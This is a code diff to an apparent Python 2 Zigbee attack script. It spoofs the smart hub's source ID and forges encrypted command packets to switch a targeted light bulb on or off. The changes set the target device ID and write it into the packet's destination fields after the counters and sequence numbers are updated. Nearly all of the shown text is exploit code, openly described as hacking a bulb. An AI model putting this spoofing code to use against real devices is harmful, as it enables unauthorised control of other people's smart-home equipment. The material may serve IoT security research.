@@ -31,10 +31,10 @@ import os
 
 
 # STATIC DEFAULTS:
+TARGET_DEVICE_ID = "F973" # light bulb to be hacked
 DEFAULT_KB_CHANNEL = 11
 DEFAULT_KB_DEVICE = '10.10.10.2'
 SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
-TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked
 command_packet_file = "command_packet_format"
 TURN_ON_COMMAND_CODE = '\x01'
 TURN_OFF_COMMAND_CODE = '\x00'
@@ -95,6 +95,8 @@ decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_counter
 encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
 encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
 encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter
+encrypted_command_packet.payload.fields['dest_addr'] = int(TARGET_DEVICE_ID,16)
+encrypted_command_packet.payload.payload.fields['destination'] = int(TARGET_DEVICE_ID,16)
 
 
 print "Encrypting message..."
